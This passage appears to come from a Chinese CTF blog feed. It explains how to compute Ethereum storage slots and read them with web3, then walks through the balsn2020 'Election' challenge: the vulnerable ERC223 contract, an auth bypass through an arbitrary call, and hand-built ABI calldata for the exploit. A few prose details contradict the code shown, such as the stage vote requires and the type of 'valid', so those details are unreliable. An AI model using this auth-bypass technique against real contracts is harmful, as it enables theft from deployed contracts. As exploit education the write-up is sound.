&#125;<br><br>    function calc_1(uint k, uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(abi.encodePacked(k, p));<br>    &#125;<br><br>    function cal_addr(uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(abi.encodePacked(p));<br>    &#125;<br>        function cal_uint(uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(p);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>调用函数可以获取<code>uints1[address1] = 0xafef6be2b419f4d69d56fe34788202bf06650015554457a2470181981bcce7ef</code></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/bd6cd15bcb5661e2d086b12ac5c0cc85.png"></p><ul><li>使用web3.js</li></ul><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;web3&#x27;</span>);<br><span class="hljs-keyword">var</span> web3 = <span class="hljs-keyword">new</span> Web3(HTTPProvider(your rpc));<br><br>index = <span class="hljs-string">&#x27;0000000000000000000000000000000000000000000000000000000000000005&#x27;</span><br>key =  <span class="hljs-string">&#x27;000000000000000000000000bccc714d56bc0da0fd33d96d2a87b680dd6d0df6&#x27;</span><br>newKey =  web3.utils.sha3(key + index, &#123;<span class="hljs-string">&quot;encoding&quot;</span>:<span class="hljs-string">&quot;hex&quot;</span>&#125;)<br><br><span class="hljs-built_in">console</span>.log(newKey);<br></code></pre></div></td></tr></table></figure><p>也能得到相同的值。</p><ul><li>使用python下web3</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3,HTTPProvider<br><span class="hljs-keyword">from</span> eth_abi <span class="hljs-keyword">import</span> encode_abi<br><span class="hljs-keyword">from</span> eth_utils <span class="hljs-keyword">import</span> keccak<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytesTohex</span>(<span class="hljs-params">data</span>):</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(bytes_to_long(data))<br><br>index = <span class="hljs-string">&#x27;0000000000000000000000000000000000000000000000000000000000000005&#x27;</span><br>key =  <span class="hljs-string">&#x27;000000000000000000000000bccc714d56bc0da0fd33d96d2a87b680dd6d0df6&#x27;</span><br>contract_address = <span class="hljs-string">&quot;0xB70D357314CA537E275E1F5891C35026Bf61ad25&quot;</span><br><br>slot5 = Web3.keccak(encode_abi([<span class="hljs-string">&#x27;address&#x27;</span>,<span class="hljs-string">&#x27;uint&#x27;</span>], [<span class="hljs-string">&#x27;0xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6&#x27;</span>,<span class="hljs-number">0x05</span>]))<br>slot7 = keccak(encode_abi([<span class="hljs-string">&#x27;uint&#x27;</span>], [<span class="hljs-number">0x07</span>]))<br>slot8 = keccak(encode_abi([<span class="hljs-string">&#x27;uint&#x27;</span>], [<span class="hljs-number">0x08</span>]))<br><span class="hljs-built_in">print</span>(bytesTohex(slot5))<br><span class="hljs-built_in">print</span>(bytesTohex(slot7))<br><span class="hljs-built_in">print</span>(bytesTohex(slot8))<br><br></code></pre></div></td></tr></table></figure><p>所以可以计算得到</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">对于uints1[address1]位置在<span class="hljs-number">0xafef6be2b419f4d69d56fe34788202bf06650015554457a2470181981bcce7ef</span><br>uints1[address2]位置在<span class="hljs-number">0xb01ced36af2255129ceb004046ab791f2c883dd74d458026d7b81c7aaff3566b</span><br>structs1[address1]位置在<span class="hljs-number">0x720c187f2880b2567f9fccc279625ea13024b8b82a6f73e26d9ca6d82ede1cc5</span><br>structs1[address2]位置在<span class="hljs-number">0x0dd425230ba48d6e0641f6db78455be91ddb278d66cd6b80d80fdf73dde88f45</span><br>uintarray的第一个元素的位置在<span class="hljs-number">0xa66cc928b5edb82af9bd49922954155ab7b0942694bea4ce44661d9a8736c688</span><br>deviceDataArray的第一个位置在<span class="hljs-number">0xf3f7a9fe364faab93b216da50a3214154f22a0a2b415b23a84c8169e8b636ee3</span><br></code></pre></div></td></tr></table></figure><h2 id="读取storage"><a href="#读取storage" class="headerlink" title="读取storage"></a>读取storage</h2><p>利用代码，getStorageAt第二个参数就是上面计算得到的slot索引值</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;web3&#x27;</span>);<br><span class="hljs-comment">// 建立web3物件</span><br><span class="hljs-keyword">var</span> web3 = <span class="hljs-keyword">new</span> Web3();<br><span class="hljs-comment">// 連線到 ropsten 測試節點</span><br><br>contract_address = <span class="hljs-string">&quot;0xB70D357314CA537E275E1F5891C35026Bf61ad25&quot;</span><br><span class="hljs-keyword">const</span> getStorage = (<span class="hljs-keyword">async</span>()=&gt;&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ;i++)&#123;<br>        <span class="hljs-comment">// console.log(i)</span><br>        <span class="hljs-keyword">await</span> web3.eth.getStorageAt(contract_address, i).then(<span class="hljs-built_in">console</span>.log)<br>    &#125;<br>&#125;)<br>getStorage();<br></code></pre></div></td></tr></table></figure><p>或者用python都行。</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">data1 = w3.eth.get<span class="hljs-constructor">StorageAt(<span class="hljs-params">contract_address</span>,<span class="hljs-params">slot5</span>)</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>合约Function Selector and Argument Encoding</title>
    <link href="/2022/08/07/2022-8-7-%E5%90%88%E7%BA%A6Function%20Selector%20and%20Argument%20Encoding/"/>
    <url>/2022/08/07/2022-8-7-%E5%90%88%E7%BA%A6Function%20Selector%20and%20Argument%20Encoding/</url>
    
    <content type="html"><![CDATA[<h1 id="合约Function-Selector-and-Argument-Encoding"><a href="#合约Function-Selector-and-Argument-Encoding" class="headerlink" title="合约Function Selector and Argument Encoding"></a>合约Function Selector and Argument Encoding</h1><p><a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">wiki部分</a></p><p>wiki上的知识还是容易理解的，简单来讲就是在Ethereum中通过ABI（二进制接口）可以知道函数的信息，包括参数，函数签名等等。而ABI编码有着规定好的编码方式,wiki主要讲的就是如何进行ABI编码。</p><h2 id="balsn2020-Election例题"><a href="#balsn2020-Election例题" class="headerlink" title="balsn2020 Election例题"></a>balsn2020 Election例题</h2><p><a href="https://hitcxy.com/2021/balsn2020-election/">参考wp</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/115873135">参考博客</a><br>因为初学合约，这个例题看了挺久。</p><p><a href="https://github.com/hitcxy/blockchain-challenges/tree/master/2020/balsn/Election">合约源码</a></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pa">pragma solidity &#x3D;0.6.12;<br>pragma experimental ABIEncoderV2;<br><br>interface IERC223 &#123;<br>    function name() external view returns (string memory);<br>    function symbol() external view returns (string memory);<br>    function decimals() external view returns (uint8);<br>    function totalSupply() external view returns (uint);<br>    function balanceOf(address account) external view returns (uint);<br>    function transfer(address to, uint value) external returns (bool);<br>    function transfer(address to, uint value, bytes memory data) external returns (bool);<br>    function transfer(address to, uint value, bytes memory data, string memory customFallback) external returns (bool);<br>    event Transfer(address indexed from, address indexed to, uint value, bytes data);<br>&#125;<br><br>contract ERC223 is IERC223 &#123;<br>    string public override name;<br>    string public override symbol;<br>    uint8 public override decimals;<br>    uint public override totalSupply;<br>    mapping (address &#x3D;&gt; uint) private _balances;<br>    string private constant _tokenFallback &#x3D; &quot;tokenFallback(address,uint256,bytes)&quot;;<br><br>    constructor (string memory _name, string memory _symbol) public &#123;<br>        name &#x3D; _name;<br>        symbol &#x3D; _symbol;<br>        decimals &#x3D; 18;<br>    &#125;<br><br>    function balanceOf(address account) public view override returns (uint) &#123;<br>        return _balances[account];<br>    &#125;<br><br>    function transfer(address to, uint value) public override returns (bool) &#123;<br>        return _transfer(msg.sender, to, value, &quot;&quot;, _tokenFallback);<br>    &#125;<br><br>    function transfer(address to, uint value, bytes memory data) public override returns (bool) &#123;<br>        return _transfer(msg.sender, to, value, data, _tokenFallback);<br>    &#125;<br><br>    function transfer(address to, uint value, bytes memory data, string memory customFallback) public override returns (bool) &#123;<br>        return _transfer(msg.sender, to, value, data, customFallback);<br>    &#125;<br><br>    &#x2F;* Helper functions *&#x2F;<br>    function _transfer(address from, address to, uint value, bytes memory data, string memory customFallback) internal returns (bool) &#123;<br>        require(from !&#x3D; address(0), &quot;ERC223: transfer from the zero address&quot;);<br>        require(to !&#x3D; address(0), &quot;ERC223: transfer to the zero address&quot;);<br>        require(_balances[from] &gt;&#x3D; value, &quot;ERC223: transfer amount exceeds balance&quot;);<br>        _balances[from] -&#x3D; value;<br>        _balances[to] +&#x3D; value;<br><br>        if (_isContract(to)) &#123;<br>            (bool success,) &#x3D; to.call&#123;value: 0&#125;(<br>                abi.encodeWithSignature(customFallback, msg.sender, value, data)<br>            );<br>            assert(success);<br>        &#125;<br>        emit Transfer(msg.sender, to, value, data);<br>        return true;<br>    &#125;<br><br>    function _mint(address to, uint value) internal &#123;<br>        require(to !&#x3D; address(0), &quot;ERC223: mint to the zero address&quot;);<br>        totalSupply +&#x3D; value;<br>        _balances[to] +&#x3D; value;<br>        emit Transfer(address(0), to, value, &quot;&quot;);<br>    &#125;<br><br>    function _isContract(address addr) internal view returns (bool) &#123;<br>        uint length;<br>        assembly &#123;<br>            length :&#x3D; extcodesize(addr)<br>        &#125;<br>        return (length &gt; 0);<br>    &#125;<br>&#125;<br><br>contract Election is ERC223 &#123;<br>    struct Proposal &#123;<br>        string name;<br>        string policies;<br>        bool valid;<br>    &#125;<br>    struct Ballot &#123;<br>        address candidate;<br>        uint votes;<br>    &#125;<br><br>    uint randomNumber &#x3D; 0;<br>    bool public sendFlag &#x3D; false;   &#x2F;&#x2F;6<br>    address public owner;           &#x2F;&#x2F;6<br>    uint public stage;              &#x2F;&#x2F;7 <br>    address[] public candidates;    &#x2F;&#x2F;8<br>    bytes32[] public voteHashes;    &#x2F;&#x2F;9<br>    mapping(address &#x3D;&gt; Proposal) public proposals;    &#x2F;&#x2F;10<br>    mapping(address &#x3D;&gt; uint) public voteCount;       &#x2F;&#x2F;11<br>    mapping(address &#x3D;&gt; bool) public voted;<br>    mapping(address &#x3D;&gt; bool) public revealed;<br><br>    event Propose(address, Proposal);<br>    event Vote(bytes32);<br>    event Reveal(uint, Ballot[]);<br>    event SendFlag(address);<br><br>    constructor() public ERC223(&quot;Election&quot;, &quot;ELC&quot;) &#123;<br>        owner &#x3D; msg.sender;<br>        _setup();<br>    &#125;<br><br>    modifier auth &#123;<br>        require(msg.sender &#x3D;&#x3D; address(this) || msg.sender &#x3D;&#x3D; owner, &quot;Election: not authorized&quot;);<br>        _;<br>    &#125;<br><br>    function propose(address candidate, Proposal memory proposal) public auth returns (uint) &#123;<br>        require(stage &#x3D;&#x3D; 0, &quot;Election: stage incorrect&quot;);<br>        require(!proposals[candidate].valid, &quot;Election: candidate already proposed&quot;);<br>        candidates.push(candidate);<br>        proposals[candidate] &#x3D; proposal;<br>        emit Propose(candidate, proposal);<br>        return candidates.length - 1;<br>    &#125;<br><br>    function vote(bytes32 voteHash) public returns (uint) &#123;<br>        require(stage &#x3D;&#x3D; 1, &quot;Election: stage incorrect&quot;);<br>        require(!voted[msg.sender], &quot;Election: already voted&quot;);<br>        voted[msg.sender] &#x3D; true;<br>        voteHashes.push(voteHash);<br>        emit Vote(voteHash);<br>        return voteHashes.length - 1;<br>    &#125;<br><br>    function reveal(uint voteHashID, Ballot[] memory ballots) public &#123;<br>        require(stage &#x3D;&#x3D; 2, &quot;Election: stage incorrect&quot;);<br>        require(!revealed[msg.sender], &quot;Election: already revealed&quot;);<br>        require(voteHashes[voteHashID] &#x3D;&#x3D; keccak256(abi.encode(ballots)), &quot;Election: hash incorrect&quot;);<br>        revealed[msg.sender] &#x3D; true;<br><br>        uint totalVotes &#x3D; 0;<br>        for (uint i &#x3D; 0; i &lt; ballots.length; i++) &#123;<br>            address candidate &#x3D; ballots[i].candidate;<br>            uint votes &#x3D; ballots[i].votes;<br>            totalVotes +&#x3D; votes;<br>            voteCount[candidate] +&#x3D; votes;<br>        &#125;<br>        require(totalVotes &lt;&#x3D; balanceOf(msg.sender), &quot;Election: insufficient tokens&quot;);<br>        emit Reveal(voteHashID, ballots);<br>    &#125;<br><br>    function getWinner() public view returns (address) &#123;<br>        require(stage &#x3D;&#x3D; 3, &quot;Election: stage incorrect&quot;);<br>        uint maxVotes &#x3D; 0;<br>        address winner &#x3D; address(0);<br>        for (uint i &#x3D; 0; i &lt; candidates.length; i++) &#123;<br>            if (voteCount[candidates[i]] &gt; maxVotes) &#123;<br>                maxVotes &#x3D; voteCount[candidates[i]];<br>                winner &#x3D; candidates[i];<br>            &#125;<br>        &#125;<br>        return winner;<br>    &#125;<br><br>    function giveMeMoney() public &#123;<br>        require(balanceOf(msg.sender) &#x3D;&#x3D; 0, &quot;Election: you&#39;re too greedy&quot;);<br>        _mint(msg.sender, 1);<br>    &#125;<br><br>    function giveMeFlag() public &#123;<br>        require(msg.sender &#x3D;&#x3D; getWinner(), &quot;Election: you&#39;re not the winner&quot;);<br>        require(proposals[msg.sender].valid, &quot;Election: no proposal from candidate&quot;);<br>        if (_stringCompare(proposals[msg.sender].policies, &quot;Give me the flag, please&quot;)) &#123;<br>            sendFlag &#x3D; true;<br>            emit SendFlag(msg.sender);<br>        &#125;<br>    &#125;<br><br>    &#x2F;* Helper functions *&#x2F;<br>    function _setup() public auth &#123;<br>        address Alice &#x3D; address(0x9453);<br>        address Bob &#x3D; address(0x9487);<br>        _setStage(0);<br>        propose(Alice, Proposal(&quot;Alice&quot;, &quot;This is Alice&quot;, true));<br>        propose(Bob, Proposal(&quot;Bob&quot;, &quot;This is Bob&quot;, true));<br>        voteCount[Alice] &#x3D; uint(-0x9453);<br>        voteCount[Bob] &#x3D; uint(-0x9487);<br>        _setStage(1);<br>    &#125;<br><br>    function _setStage(uint _stage) public auth &#123;<br>        stage &#x3D; _stage &amp; 0xff;<br>    &#125;<br><br>    function _stringCompare(string memory a, string memory b) internal pure returns (bool) &#123;<br>        return keccak256(abi.encodePacked(a)) &#x3D;&#x3D; keccak256(abi.encodePacked(b));<br>    &#125;<br>    <br>    &#x2F;* custom added functions *&#x2F;<br>    function testdeet(address to, uint value, bytes memory data, string memory customFallback) pure public returns (bytes memory)&#123;<br>        return abi.encodeWithSignature(customFallback, to, value, data);<br>    &#125;<br><br>    function properEncode(address candidate, Proposal memory proposal, address t1, address t2) pure public &#123;<br><br>    &#125;<br><br>    function ballotEncode(Ballot[] memory ballots) pure public returns (bytes32)&#123;<br>    return keccak256(abi.encode(ballots));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h3><p>合约使用的是ERC223的代币，存在一个父类和子合约。在父类中，存在<code>_transfer</code>接口能够任意调用函数，但是需要构造合适的ABI编码格式。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">if (_isContract(to)) &#123;<br>            (bool success,) &#x3D; to.call&#123;value: 0&#125;(<br>                abi.encodeWithSignature(customFallback, msg.sender, value, data)<br>            );<br>            assert(success);<br>        &#125;<br></code></pre></div></td></tr></table></figure><p>关于<code>call</code>和<code>delegatecall</code>和<code>callcode</code>的区别如下，这个题特意用了call函数，为了能够绕过后面的auth认证，因为call函数会修改msg值为调用者，然后就能让调用者为合约本身，就能绕过auth了。<br><img src="https://img-blog.csdnimg.cn/img_convert/d21986013505bc93814b16850a980c77.png"><br>例如如下合约即可验证。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p"><br>contract A &#123;<br>    address public temp1;<br>    uint256 public temp2;<br>    function three_call(address addr) public &#123;<br>            addr.call(bytes4(keccak256(&quot;test()&quot;)));                 &#x2F;&#x2F; 情况1<br>            &#x2F;&#x2F;addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));       &#x2F;&#x2F; 情况2<br>            &#x2F;&#x2F;addr.callcode(bytes4(keccak256(&quot;test()&quot;)));           &#x2F;&#x2F; 情况3   <br>    &#125;<br>&#125; <br> <br>contract B &#123;<br>    address public temp1;<br>    uint256 public temp2;    <br>    function test() public  &#123;<br>            temp1 &#x3D; msg.sender;        <br>            temp2 &#x3D; 100;    <br>    &#125;<br>    function test2() public returns (uint256)&#123;<br>        return uint(-0x9453);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>子合约实现了一个投票系统，主要包含<code>propose</code>,<code>vote</code>,<code>reveal</code>三个函数，stage变量用于调用不同函数时设置为不同的值。合约定义了两个结构体。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">&#x2F;&#x2F; 用于存放candidate竞争者的信息<br>struct Proposal &#123;<br>    string name;<br>    string policies;<br>    bool valid;<br>&#125;<br>&#x2F;&#x2F;用于存放每个candidate获得票数<br>struct Ballot &#123;<br>    address candidate;<br>    uint votes;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>auth认证，需要调用者为合约本身，正好是call函数的用法。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">modifier auth &#123;<br>    require(msg.sender &#x3D;&#x3D; address(this) || msg.sender &#x3D;&#x3D; owner, &quot;Election: not authorized&quot;);<br>    _;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>主要函数（propose,_setStage有auth认证）</p><ul><li><p><code>propose(address candidate, Proposal memory proposal)</code>函数用于进行投票，并且进行了auth认证。此时需要stage==0，同时Proposal结构体下的valid变量需要设置为给定的字符串。</p></li><li><p><code>vote(bytes32 voteHash)</code>函数用于确认投票，需要stage==0。参数为经过<code>keccak256(abi.encode(ballots))</code>编码的Ballot[]数组的bytes32值。</p></li><li><p><code>reveal(uint voteHashID, Ballot[] memory ballots)</code>函数用于计算每个candidate账户的总票数，需要stage==2。</p></li><li><p><code>getWinner()</code>函数用于判断出最终获胜者，所以最终目的为让我们的账户成为winner，这样就能调用giveMeFlag()获取flag。</p></li><li><p><code>_setStage(uint _stage)</code>用于设置stage变量，但有auth认证。</p></li></ul><p>而合约在初始化的时候将stage的值设为了1，并且只有两个账户。<br><img src="https://img-blog.csdnimg.cn/img_convert/e66ea2e92f91382ae658ab69e5db7b20.png"></p><p>所以第一步需要绕过auth，这样才能调用到<code>_setStage</code>来设置stage变量的值，继而调用其他函数。而调用任意函数的漏洞就是上面说的父类里面的call函数。</p><p>调用不用函数的编码如下<br><img src="https://img-blog.csdnimg.cn/img_convert/632416c1166c50200e3a4497f0e8e9a6.png"></p><p>所以当调用<code>_setStage</code>的时候，函数只接受一个参数，那参数的内容就是<code>msg.sender</code>的值所以我们要设置stage变量的内容，需要找到合约地址后缀是<code>00 01 02 03</code>的。<a href="https://vanity-eth.tk/">利用这个网站</a></p><p>而当调用<code>propose</code>的时候，函数接受两个参数，第一个是address地址形式，第二个是<code>Propose</code>结构体。所以根据abi编码方式，首先直接写入address定值，然后是<code>proposal</code>结构体的offset <code>0x20*2=0x40</code>，之后遍历结构体的参数有三个，前两个是变长类型，则name的offset为 <code>0x20*3=0x60</code>，policies为<code>0x60 + 0x20*2 = 0xa0</code>（前一个参数的长度和data内容各占0x20），最后是valid是bool类型不需要存储offset。然后开始重新遍历变长类型，先写入参数的长度，再写入参数的值。所以在调用这个函数的时候，data的值就需要进行精心构造成符合abi编码的格式。<br><img src="https://img-blog.csdnimg.cn/img_convert/0f52ce485e7167d4d78c90e102f64608.png"><br>例如如果要利用call函数调用propose函数，address地址为0x9aC4ef4fed53a395Bcb4004Cd8DffEE73CC46800,结构体中name为<code>kkfine</code>,policies为<code>Give me the flag, please</code>,valid为<code>true</code>,则call函数中data的内容为</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm"><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000006</span><br><span class="hljs-number">6</span>b<span class="hljs-number">6</span>b<span class="hljs-number">66696e650000000000000000000000000000000000000000000000000000</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000018</span><br><span class="hljs-number">47697665206</span>d<span class="hljs-number">652074686520666</span><span class="hljs-keyword">c</span><span class="hljs-number">61672</span><span class="hljs-keyword">c</span><span class="hljs-number">20706</span><span class="hljs-keyword">c</span><span class="hljs-number">656173650000000000000000</span><br></code></pre></div></td></tr></table></figure><p>而前半部分则如下，所以value参数内容应该是0x40</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">slot0</span>     msg.sender/candidate<br><span class="hljs-attribute">slot1</span>     offset of Proposal     <span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000040</span><br><span class="hljs-attribute">slot2</span>     offset of name         <span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span><br><span class="hljs-attribute">slot3</span>     offset of plicies      <span class="hljs-number">0</span>x<span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>a<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>或者使用题目的<code>testdeet</code>接口也能看出来<br><img 